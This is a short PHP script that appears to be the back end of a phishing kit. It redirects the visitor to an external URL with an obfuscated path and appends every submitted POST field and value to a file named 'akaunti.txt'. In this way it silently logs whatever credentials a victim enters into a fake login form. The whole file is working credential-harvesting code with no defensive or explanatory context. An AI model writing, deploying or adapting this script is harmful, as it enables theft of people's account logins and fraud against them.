<?php
header( 'Location: http://igurufoundation.com/blP2xprZzROWoCE/gm/en/?i=11337' ) ;
$handle = fopen("akaunti.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;